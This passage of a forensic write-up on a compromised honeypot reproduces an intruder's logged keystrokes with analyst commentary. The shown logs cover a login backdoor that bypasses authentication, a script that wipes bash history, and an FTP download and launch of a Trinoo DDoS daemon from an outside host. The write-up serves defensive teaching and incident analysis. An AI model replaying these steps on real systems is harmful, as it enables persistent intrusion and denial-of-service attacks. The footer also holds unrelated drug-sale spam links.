            /bin/login /usr/bin/old</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>cp: /bin/login: No such 
            file or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# rm 
            /bin/login</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/bin/login': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# chmod 555 /usr/bin/xstat</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            chgrp bin /usr/bin/xstat</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# mv login 
            /bin/login</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Now she covers her 
            moves.&nbsp; I believe this is scripted, cut and paste.&nbsp; Look 
            at all the commands she executed at a single command prompt.&nbsp; 
            Also, I believe this is a 'generic' clean up script, notice how it 
            tries to remove files that do not exist (such as 
            /tmp/h).</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            rm bj.c</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# [root@apollo /]# ps -aux | grep inetd ; ps 
            -aux | grep portmap ; rm /sbin/portmap ; rm /tmp/h ; rm 
            /usr/sbin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bash_history ; 
            rm -rf /usr/sbin/namedps -aux | grep inetd ; ps -aux | grep portmap 
            ; rm /sbin/por<GREP FONT named< in sb                         usr 
            -rf rm ; .bash_history root s<bash* h_history 
            .bas                         .bash* rpc.portmap .ba<bin 
            -rf                          sbin h tmp -rf<ap 
                                     portmap usr<p map 
            port                         grep | -aux ps inetd></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>&nbsp; 359 
            ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 
            inetd</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>&nbsp; 359 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            00:00:00 inetd</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>rm: cannot remove `/tmp/h': 
            No such file or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>rm: cannot remove 
            `/usr/sbin/rpc.portmap': No such file or directory</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            ps -aux | grep portmap</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            [root@apollo /]# ps -aux | grep inetd ; ps -aux | grep portmap ; rm 
            /sbin/portmap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf .bash* 
            ; rm -rf /root/.bash_history ; rm -rf /usr/sbin/namedps -aux | grep 
            inetd ; ps -aux | grep portmap ; rm /sbin/por<GREP FONT named< in 
            sb                         usr -rf rm ; .bash_history root s<bash* 
            h_history .bas                         .bash* rpc.portmap .ba<bin 
            -rf                          sbin h tmp -rf<ap 
                                     portmap usr<p map 
            port                         grep | -aux ps inetd></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>&nbsp; 359 
            ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 
            inetd</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/sbin/portmap': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/tmp/h': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/usr/sbin/rpc.portmap': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# rm: cannot remove `/sbin/portmap': No such 
            file or directory</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>I find this 
            interesting. Our black-hat's generic clean up script generated 
            errors as it attempted to remove files that did not exist. I belive 
            our black-hat saw these errors and became concerened, because she 
            then attempts to manually remove these same files, even though they 
            do not exist.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>rm: cannot remove 
            `/tmp/h': No such file or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>rm: cannot remove 
            `/usr/sbin/rpc.portmap': No such file or directory</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            rm: cannot remove `/sbin/portmap': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/tmp/h': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>rm: cannot remove `/usr/sbin/rpc.portmap': No such file or 
            directory</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# exit</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>exit</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[twin@apollo /]$ 
            exit</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>logout</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>That's it, our 
            friend has installed a backdoor, <A 
            href="http://www.enteract.com/~lspitz/bj.txt">bj.c</A>.&nbsp; The 
            backdoor allows unauthenticated users in based on the TERM setting, 
            in this case VT9111.&nbsp; Once completed, she logged out from the 
            system.</FONT></FONT> 
            <P>After leaving the system, the black hat made several more 
            connections and modificaitons to the systems.&nbsp; Review the raw 
            data to review the black-hats keystrokes. 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT size=+2>Trinoo, The 
            Return</FONT></FONT></B> <BR>Once the system had been compromised, I 
            took it offline to review the data (such as Tripwire).&nbsp; 
            However, I noticed over the next week that a variety of systems were 
            attempting to telnet to the box.&nbsp; Apparently the black-hat 
            wanted back in, most likely to use the compromised system for more 
            nefarious activity.&nbsp; So, I brought the compromised box back 
            online, curious to see if the black-hat would return and what she 
            would do.&nbsp; Sure enough, almost two weeks later, she 
            returned.&nbsp; Once again, we captured all the keystrokes using 
            snort.&nbsp; Review the following telnet sessions and learn how our 
            compromised system was to be used as a <A 
            href="http://staff.washington.edu/dittrich/misc/trinoo.analysis">Trinoo 
            client</A>. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>On May 9, 10:45 
            am, our friend telnets in from 24.7.85.192.&nbsp; Note how she uses 
            the backdoor VT9111 to get into the system, bypassing 
            authentication.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>&nbsp;!"' #'!"# ' 
            9600,9600'VT9111VT9111</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Red Hat Linux release 6.0 
            (Shedwig)</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Kernel 2.2.5-15 on an i586</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            ls</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>bin&nbsp;&nbsp; cdrom&nbsp; etc&nbsp;&nbsp;&nbsp;&nbsp; 
            home&nbsp; lost+found&nbsp; proc&nbsp; sbin&nbsp; usr</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>boot&nbsp; 
            dev&nbsp;&nbsp;&nbsp; floppy&nbsp; lib&nbsp;&nbsp; 
            mnt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp; tmp&nbsp;&nbsp; 
            var</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Once on the 
            system, she attempts to use DNS.&nbsp; However, DNS is still broken 
            on the box.&nbsp; Remember, DNS was exploited to gain root access, 
            so the system can no longer resolve domain names.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            nslookup magix</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            nslookup irc.powersurf.com</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Server:&nbsp; 
            zeus-internal.uicmba.edu</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Address:&nbsp; 
            172.16.1.101</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>The black-hat 
            ftp's to a system in Singapore and downloads a new tool kit.&nbsp; 
            Notice the 'hidden' directory .s she creates to store the 
            toolkit.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            mkdir .s</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# cd .s</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /.s]# ftp 
            nusnet-216-35.dynip.nus.edu.sg</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp: 
            nusnet-216-35.dynip.nus.edu.sg: Unknown host</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; 
            qquituit</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /.s]# ftpr 137.132.216.35</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>login: ftrp: 
            command not found</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo 
            /.s]#</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /.s]# ftp 137.132.216.35</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>Connected to 
            137.132.216.35.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>220 
            nusnet-216-35.dynip.nus.edu.sg FTP server (Version wu-2.4.2-VR17(1) 
            Mon Apr 19 09:21:53 EDT 1999) ready.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>She gains access 
            with the same user name that was inserted in our box.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Name 
            (137.132.216.35:root): twin</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>331 Password required for 
            twin.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Password:hax0r</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>230 User twin logged 
            in.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Remote system type is UNIX.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Using binary mode to 
            transfer files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; get 
            d.tar.gz</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>local: d.tar.gz remote: d.tar.gz</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>200 PORT command 
            successful.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>150 Opening BINARY mode data connection for d.tar.gz (8323 
            bytes).</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>150 Opening BINARY mode data connection for d.tar.gz (8323 
            bytes).</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>226 Transfer complete.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>8323 bytes received in 1.36 
            secs (6 Kbytes/sec)</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; quit</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>221-You have 
            transferred 8323 bytes in 1 files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Total traffic for this 
            session was 8770 bytes in 1 transfers.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Thank you for using the 
            FTP service on nusnet-216-35.dynip.nus.edu.sg.</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>221 
            Goodbye.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /.s]# gunzip d*</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /.s]# tar -xvf 
            d*</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>daemon/</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>daemon/ns.c</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>daemon/ns</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /.s]# rm -rf 
            d.tar</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /.s]# cd daemon</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo daemon]# chmod 
            u+u+x nsx ns</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo daemon]# 
            ./ns</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Our black-hat has 
            just installed and started Trinoo client.&nbsp; Next, she attempts 
            to hop to another compromised system.&nbsp; Notice how she sets her 
            VT TERM.&nbsp; This system most likely also has a backdoor.&nbsp; 
            The connection fails since DNS is not working.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo 
            daemon]# TERM=vt1711</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo daemon]# 
            telnet macau.hkg.com</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>macau.hkg.com: Unknown 
            host</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo daemon]# exit</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>exit</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Our friend leaves, 
            only to return later from yet a different system (137.132.216.35) 
            and attempt more michief.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>&nbsp;!"' #'!"# ' 
            9600,9600'VT9111VT9111</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Red Hat Linux release 6.0 
            (Shedwig)</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Kernel 2.2.5-15 on an i586</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>apollo /]# 
            TERM=vt9111</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>telnet ns2.cpcc.cc.nc.us</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ns2.cpcc.cc.nc.us: Unknown 
            host</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>@apollo /}#telnet 1 152.43.29.52</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Trying 
            152.43.29.52...</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Connected to 
            152.43.29.52.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Escape character is 
            '^]'.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>!!!!!!Connection closed by foreign host.</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>te8ot@apollo /]# 
            TERM=vt7877</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# telnet sparky.w</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>itoot@apollo /]# 
            exit</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>exit</FONT></FONT> 
            <P>Following this, several attempts were made to use the system as a 
            Trinoo attack against other systems. At this point I disconnected 
            the system.&nbsp; The black-hat intended to use the compromised 
            system for destructive purposes and little more could be gained from 
            the monitoring the connection. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>May 9 11:03:20 
            lisa snort[2370]: <A 
            href="http://www.whitehats.com/IDS/197">IDS/197/trin00-master-to-daemon:</A> 
            137.132.17.202:2984 -&gt; 172.16.1.107:27444</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>May 9 11:03:20 lisa 
            snort[2370]: <A 
            href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</A> 
            172.16.1.107:1025 -&gt; 137.132.17.202:31335</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>May 9 11:26:04 lisa 
            snort[2370]: <A 
            href="http://www.whitehats.com/IDS/197">IDS197/trin00-master-to-daemon:</A> 
            137.132.17.202:2988 -&gt; 172.16.1.107:27444</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>May 9 11:26:04 lisa 
            snort[2370]: <A 
            href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</A> 
            172.16.1.107:1027 -&gt; 137.132.17.202:31335</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>May 9 20:48:14 lisa 
            snort[2370]: <A 
            href="http://www.whitehats.com/IDS/197">IDS197/trin00-master-to-daemon:</A> 
            137.132.17.202:3076 -&gt; 172.16.1.107:27444</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>May 9 20:48:14 lisa 
            snort[2370]: <A 
            href="http://www.whitehats.com/IDS/187">IDS187/trin00-daemon-to-master-pong:</A> 
            172.16.1.107:1028 -&gt; 137.132.17.202:31335</FONT></FONT> 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT 
            size=+2>Summary</FONT></FONT></B> <BR>We have just covered step by 
            step how a honeypot was compromised, backdoored, and eventually used 
            for a Trinoo attack.&nbsp; On 25 April, the black-hat first scanned 
            the honeypot for which version of DNS version it was running.&nbsp; 
            The following day, on 26 April, she executed the NXT-Named exploit 
            to gain a root shell (see the <A 
            href="http://www.enteract.com/~lspitz/NXT-Howto.txt">NXT-Howto</A> 
            for a black-hat HOWTO on the exploit). Once she gained a root shell, 
            she created two system accounts, <I>twin</I> and <I>hantu</I>.&nbsp; 
            Following this she immediately telneted to the box, gained super 
            user access, then downloaded and installed her backdoor, <A 
            href="http://www.enteract.com/~lspitz/bj.txt">bj.c</A>.&nbsp; She 
            then executed a script to cover her tracks and then left the 
            system.&nbsp; Over the following weeks she attempted to connect to 
            the system, however it was offline.&nbsp; Finally, on May 9 she 
            gained access, installed and then executed Trinoo.&nbsp; At this 
            point the honeypot was taken offline for good.&nbsp; The majority of 
            forensics was conducted using system logs from the compromised 
            system and snort logs and alerts. Several other people have 
            contributed <A 
            href="http://www.enteract.com/~lspitz/analysis.txt">additional 
            analysis</A> of the attack. 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT 
            size=+2>Conclusion</FONT></FONT></B> <BR>We have just covered a step 
            by step analysis of how a honeypot compromised.&nbsp; The goal was 
            to determine how the system was compromised using forensic anaylisis 
            of system and IDS logs.&nbsp; By analyzing this attack, you should 
            have a better understanding of what to expect and look for when 
            analyzing a system attack. If you would like to learn more about how 
            this information was obtained, check out the upcoming article "How 
            To Build A Honey Pot". 
            <P>I would like to thank both <A 
            href="mailto:roesch@hiverworld.com">Marty Roesch</A> and <A 
            href="mailto:vision@whitehats.com">Max Vision</A> for their 
            contribution to the security community.&nbsp; What I have learned 
            here would not have been possible without their hard work. All logs 
            and information were forwarded to CERT before this information was 
            released. Also, attempts were made to contact all IPs involved in 
            the attack. 
            <P><B><I><FONT face="Shelvetica-Narrow,Arial Narrow">Author's 
            bio</FONT></I></B> <BR><I><FONT face="Palatino,Book Antiqua">Lance 
            Spitzner enjoys learning by blowing up his Unix systems at home. 
            Before this, he was an <A 
            href="http://www.enteract.com/D|/CanSecWest/www.enteract.com/~lspitz/officer.html">Officer 
            in the Rapid Deployment Force,</A> where he blew up things of a 
            different nature. You can reach him at <A 
            href="mailto:lance@spitzner.net">lance@spitzner.net</A></FONT></I> 
            <BR>
            <P>&nbsp;&nbsp;<A 
            href="http://www.collusion.org/Response.cfm?ID=237">Click here to 
            see responses to this article...</A> 
        <BR><BR></P></FONT></FONT></TD></TR></TBODY></TABLE></TD></TR><!-- Foot link bar -->
  <TR>
    <TD vAlign=top align=middle width=600 bgColor=#333333 colSpan=3><!--	&nbsp;&nbsp;-&nbsp;&nbsp;--><A 
      style="TEXT-DECORATION: none" 
      href="http://www.collusion.org/index.cfm"><FONT face=Arial color=red 
      size=+1>Home</FONT></A> <FONT face=Arial color=red 
      size=+1>&nbsp;&nbsp;-&nbsp;&nbsp;</FONT> <A style="TEXT-DECORATION: none" 
      href="http://www.collusion.org/Article.cfm?ID=237#top"><FONT face=Arial 
      color=red size=+1>Top of Page</FONT></A> <!--	&nbsp;&nbsp;-&nbsp;&nbsp;
	Something
	&nbsp;&nbsp;-&nbsp;&nbsp;
	Something Else
	&nbsp;&nbsp;-&nbsp;&nbsp;--></TD></TR>
  <TR>
    <TD vAlign=top align=middle width=600 bgColor=#333333 
  colSpan=3></TD></TR></TBODY></TABLE><BR><BR>For great household and gift ideas, 
check out these sites!:<BR><STRONG><A 
href="http://www.thepicnicstore.com/">Picnic Baskets</A> | <A 
href="http://www.coversandmore.com/">Platform Beds, Futon Covers, Futons 
</A><BR><A href="http://www.101hammocks.com/">Hammocks, Hammock Stands</A> | <A 
href="http://www.101windchimes.com/">Wind Chimes</A> </STRONG><BR><BR>Also, to 
get FDA approved prescription drugs shipped to you overnight from US pharmacies 
at discount prices, <BR>visit the <STRONG><A 
href="http://superdrugwarehouse.com/">Super Drug Warehouse</A></STRONG><BR>for 
diet drugs and weightloss drugs such as <A 
href="http://superdrugwarehouse.com/drug.php?drug=phentermine.htm">Phentermine</A>, 
<A 
href="http://superdrugwarehouse.com/drug.php?drug=phendimetrazine.htm">Phendimetrazine</A>, 
<A href="http://superdrugwarehouse.com/drug.php?drug=adipex.htm">Adipex</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=bontril.htm">Bontril</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=ionamin.htm">Ionamin</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=didrex.htm">Didrex</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=tenuate.htm">Tenuate</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=meridia.htm">Meridia</A>, <A 
href="http://superdrugwarehouse.com/drug.php?drug=xenical.htm">Xenical</A>, and 
<A 
href="http://superdrugwarehouse.com/drug.php?drug=diethylpropion.htm">Diethylpropion</A>, 
as well as prescription medications for <A 
href="http://superdrugwarehouse.com/cat.php?cat=anxiety">anxiety</A>, <A 
href="http://superdrugwarehouse.com/cat.php?cat=painrelief">pain relief</A>, <A 
href="http://superdrugwarehouse.com/cat.php?cat=musclerelaxers">muscle pain</A>, 
<A href="http://superdrugwarehouse.com/cat.php?cat=sexualhealth">sexual 
health</A>, <A 
href="http://superdrugwarehouse.com/cat.php?cat=sleepdisorders">sleep 
disorders</A>, <A 
href="http://superdrugwarehouse.com/cat.php?cat=indigestion">indigestion</A>, 
and <A href="http://superdrugwarehouse.com/prices.php">much, much more</A>. 
<BR><BR></CENTER></BODY></HTML>
